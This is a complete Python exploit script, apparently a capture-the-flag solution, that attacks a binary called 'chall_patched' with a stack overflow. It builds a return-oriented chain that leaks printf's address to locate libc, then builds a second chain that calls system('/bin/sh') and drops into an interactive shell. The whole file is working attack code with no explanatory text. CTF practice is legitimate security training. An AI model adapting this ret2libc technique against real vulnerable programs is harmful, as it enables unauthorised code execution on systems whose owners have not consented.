#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"A" * 40
    payload += ptr.p64(next(elf.gadget("ret;")))
    payload += ptr.p64(next(elf.gadget("pop rdi; ret;")))
    payload += ptr.p64(unwrap(elf.got("printf")))
    payload += ptr.p64(unwrap(elf.plt("printf")))
    payload += ptr.p64(next(elf.gadget("ret;")))
    payload += ptr.p64(unwrap(elf.symbol("main")))
    io.sendlineafter("content: ", payload)
    libc.base = ptr.u64(io.recv(6)) - 0x60770

    payload = b""
    payload += b"A" * 40
    payload += ptr.p64(next(elf.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\x00")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    io.sendlineafter("content: ", payload)

    io.sh()


if __name__ == "__main__":
    main()
